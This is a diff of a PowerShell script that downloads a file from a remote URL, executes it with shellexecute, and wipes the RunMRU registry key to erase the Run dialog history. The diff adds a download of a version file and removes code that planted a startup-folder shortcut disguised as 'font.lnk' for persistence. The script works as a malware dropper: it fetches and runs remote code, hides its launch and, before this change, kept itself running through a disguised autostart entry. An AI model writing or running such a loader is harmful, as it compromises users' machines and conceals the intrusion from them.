@@ -15,6 +15,7 @@ if ((Test-Path $file_text) -and (Get-Content $file_text) -eq (Invoke-WebRequest 
     $down.DownloadFile($url,$file)
 
     # Update the version file
+    $down.DownloadFile($url_text,$file_text)
     Set-Content $file_text (Invoke-WebRequest $url_text).Content
 }
 
@@ -24,12 +25,6 @@ $exec.shellexecute($file)
 
 # Delete registry entry
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
-
-# Create shortcut in startup folder
-$objShell = New-Object -ComObject ("WScript.Shell")
-$objShortCut = $objShell.CreateShortcut($env:USERPROFILE + "\Start Menu\Programs\Startup" + "\font.lnk")
-$objShortCut.TargetPath = $file
-$objShortCut.Save()
 
 # Exit the script
 exit
